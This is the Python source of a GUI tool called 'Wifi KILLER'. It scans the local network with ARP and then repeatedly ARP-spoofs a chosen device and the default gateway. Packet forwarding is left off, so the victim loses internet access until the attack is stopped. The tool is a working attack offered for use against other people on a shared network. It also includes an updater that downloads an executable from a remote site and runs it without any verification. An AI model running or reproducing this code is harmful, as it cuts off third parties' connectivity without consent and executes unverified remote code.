
from multiprocessing import Value
from pydoc import visiblename
import tkinter as tk
from tkinter import ttk
import argparse
import time
import os
import sys
import sched

from PIL import Image, ImageTk

from scapy.all import ARP, Ether, srp, send
import tkinter as tk
from tkinter import ttk
import scapy.all as scapy
from mac_vendor_lookup import MacLookup
import socket
import time
import threading
import ctypes
import netifaces
import os
import requests

global statusLabel
stopkw = True

UPDATE_SERVER_URL = 'https://phoeno.xyz/applications/wifi-killer/'

# Current version of your application
CURRENT_VERSION = '1.0'

def read_online_text_file(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception if the request was unsuccessful

        # Assuming the text encoding is UTF-8. Adjust if you expect a different encoding.
        text_content = response.text

        return text_content
    except requests.exceptions.RequestException as e:
        print("Error occurred:", e)
        return None

def check_for_updates():
    try:
        vurl = "https://phoeno.xyz/applications/wifi-killer/version.txt"
        print(read_online_text_file(vurl))
        if str(read_online_text_file(vurl)) != str(CURRENT_VERSION) and str(read_online_text_file(vurl)) != None:
            print(f"{read_online_text_file(vurl)} is not {CURRENT_VERSION}")
            show_alert("Phoeno Alert", 'An update is available! Downloading installation file, this might take a while')
            download_update()
        else:
            show_alert("Phoeno Alert", 'No updates available.')

    except requests.RequestException:
        show_alert("Phoeno Alert", 'Failed to check for updates.')

def download_update():
    url = UPDATE_SERVER_URL + 'wifi_killer_setup.exe'
    try:
        with requests.get(url, stream=True) as response:
            if response.status_code == 200:
                with open("wifi_killer_setup.exe", 'wb') as file:
                    chunk_size = 8192
                    for chunk in response.iter_content(chunk_size=chunk_size):
                        if chunk:
                            file.write(chunk)
                            
                show_alert("Phoeno Alert", 'Download Complete, installation file will run')
            else:
                show_alert("Phoeno Alert", f"Error: Received status code {response.status_code} for URL: {url}")
    except requests.RequestException as e:
        show_alert("Phoeno Alert", 'Failed to download update.')


    install_update()


def install_update():
    try:
        
        os.startfile("wifi_killer_setup.exe")

        print("External executable opened successfully.")
        
        sys.exit()



    except Exception as e:
        show_alert("Phoeno Alert", f'Error installing update: {str(e)}')

# Modify the scan_network() function to use a separate thread
def scan_network():
    root.protocol("WM_DELETE_WINDOW", on_quit)
    quitButton.config(command = on_quit)
    refreshButton.config(state=tk.DISABLED)
    killWifiButton.config(state=tk.DISABLED)


    def scanning_thread():
        MacLookup().update_vendors()  # Update the vendor list
        hostname = socket.gethostname()
        IP = socket.gethostbyname(hostname)
        splitIP = IP.split(".")
        target_ip = str(splitIP[0]) + "." + str(splitIP[1]) + "." + str(splitIP[2]) + ".0/24"
        result_str = ""
        # Rest of the code remains the same

        # Create ARP request packet
        arp = ARP(pdst=target_ip)

        # Create Ethernet frame
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")

        # Combine the frames
        packet = ether/arp

        # Send and receive packets
        result, _ = srp(packet, timeout=2, verbose=False)

        for sent, received in result:
            mac_address = received.hwsrc
            try:
                manufacturer = MacLookup().lookup(mac_address)
            except KeyError:
                manufacturer = "Unknown"

            print("{:<15}\t{:<17}\t{:<20}".format(received.psrc, mac_address, manufacturer))
            result_str += ("{:<15}\t{:<17}\t{:<20}\n".format(received.psrc, mac_address, manufacturer))
        # Update the ipText widget on the main thread
        
        progress["value"] = 100
        window.destroy()
        root.after(0, update_ip_text, result_str)

    def update_ip_text(result_str):
        ipText.config(state="normal")  # Enable editing the widget
        ipText.delete("1.0", tk.END)   # Clear existing content
        ipText.insert("1.0", result_str)  # Insert new scan results
        ipText.config(state="disabled")  # Disable editing the widget


        root.protocol("WM_DELETE_WINDOW", root.destroy)
        quitButton.config(command = root.destroy)
        refreshButton.config(state=tk.NORMAL)
        killWifiButton.config(state=tk.NORMAL)

    def createProgressWindow():
        global progress
        global window
        window = tk.Toplevel()
        
        
        window.protocol("WM_DELETE_WINDOW", on_closing)

        window.geometry("400x90")
        window.wm_title("Process is Running")

        percentage = ttk.Label(window, text = "%")
        percentage.pack(side = "bottom")

        progress = ttk.Progressbar(window, orient="horizontal", length = 300, mode = "determinate")
        progress.pack()
        i = 0
        while progress["value"] != 100:
            try:
                while progress["value"] < 99:
                    time.sleep(8/1000)
                    progress["value"] = i
                    i += 0.1
                    percentage.config(text = str(int(progress["value"])) + "%")
                if progress["value"] == 100:
                    break
            except:
                break
                
            
        try:
            window.destroy()
        except:
            pass
    # Start the network scanning process in a separate thread

    scanning_thread = threading.Thread(target=scanning_thread)
    scanning_thread.start()

    createProgressWindow = threading.Thread(target=createProgressWindow)
    createProgressWindow.start()

def on_quit():
    sys.exit()

def show_alert(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x0 | 0x40)

def stop():
    global stopkw
    stopkw = True

def enable_ip_route(verbose=True):
    pass

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    
def spoof(target_ip, host_ip, verbose=True):
    try:
        target_mac = get_mac(target_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        send(arp_response, verbose=0)
        if verbose:
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
    except Exception as e:
        show_alert("ERROR", e)


def restore(target_ip, host_ip, verbose=True):
    try:
        target_mac = get_mac(target_ip)
        host_mac = get_mac(host_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        send(arp_response, verbose=0, count=7)
        if verbose:
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
    except Exception as e:
        show_alert("ERROR", e)
        stopKillWifi()         

def on_closing():

    show_alert("ALERT", "Doing this action could cause your system to corrupt!")

def startKillWifi():
    global stopkillEvent
    root.protocol("WM_DELETE_WINDOW", stopKillWifi)
    quitButton.config(command = stopKillWifi)
    killWifiButton.config(state=tk.DISABLED)
    refreshButton.config(state=tk.DISABLED)
    stopButton.config(state=tk.NORMAL)
    show_alert("SUCCESS!", f"{arpTarget.get()} LOST ITS CONNECTION!!")
    stopkillEvent = threading.Event()
    threading.Thread(target=killWifi).start()

def stopKillWifi():
    global stopkillEvent
    root.protocol("WM_DELETE_WINDOW", root.destroy)
    quitButton.config(command = root.destroy)
    stopkillEvent.set()
    killWifiButton.config(state=tk.NORMAL)
    refreshButton.config(state=tk.NORMAL)
    stopButton.config(state=tk.DISABLED)
    show_alert("SUCCESS!", f"{arpTarget.get()} got its internet back!!")

def killWifi():
    global stopkillEvent
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    IP = socket.gethostbyname(socket.gethostname())
    target, host, verbose = arpTarget.get(), default_gateway, True
    enable_ip_route()
    try:
        while not stopkillEvent.is_set():
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(1)
    except Exception as e:
        print (e)
    print("[!] ENDING")
    restore(target, host)
    restore(host, target)

try:
    from ctypes import windll
    windll.shcore.SetProcessDpiAwareness(1)
except:
    pass


gateways = netifaces.gateways()
default_gateway = gateways['default'][netifaces.AF_INET][0]
print(default_gateway)

hostname = socket.gethostname()
IP = socket.gethostbyname(hostname)

target_ip = IP # Enter your target IP
gateway_ip = default_gateway # Enter your gateway's IP

stopkillEvent = threading.Event()
stopkillEventThread = threading.Event()

root = tk.Tk()


root.title("Wifi KILLER")
root.geometry("600x400")


inputFrame = ttk.Frame(root)
inputFrame.grid()

buttonFrame = ttk.Frame(root, padding=(20, 10))
buttonFrame.grid(sticky="EW")
buttonFrame.columnconfigure(0, weight=1)
buttonFrame.columnconfigure(1, weight=1)

arpFrame = ttk.Frame(root, padding=(20, 10))
arpFrame.grid(sticky="EW")
arpFrame.columnconfigure(0, weight=1)
arpFrame.columnconfigure(1, weight=1)


userName = tk.StringVar()

result = ""

ipText = tk.Text(inputFrame, height = 10)  # Define the label here
ipText.grid(row=0, column=0)

ipText.insert("1.0", "Press Refresh to list devices in your network")
ipText["state"] = "disabled"

refreshButton = ttk.Button(buttonFrame, text="Refresh", command=scan_network)
refreshButton.grid(row=0, column=0)

quitButton = ttk.Button(buttonFrame, text="Quit", command=root.destroy)
quitButton.grid(row=0, column=1)

arpTarget = ttk.Entry(arpFrame, width=30)
arpTarget.pack(pady=10)

killWifiButton = ttk.Button(arpFrame, text="KILL WIFI!", command = startKillWifi)
killWifiButton.pack()

stopButton = ttk.Button(arpFrame, text="Stop KILL", command = stopKillWifi, state=tk.DISABLED)
stopButton.pack()


update_button = ttk.Button(root, text="Check For UPDATE!", command= check_for_updates)
update_button.grid(column=0, row = 3)

statusLabel = ttk.Label(arpFrame, text = "")
statusLabel.pack()
root.mainloop()
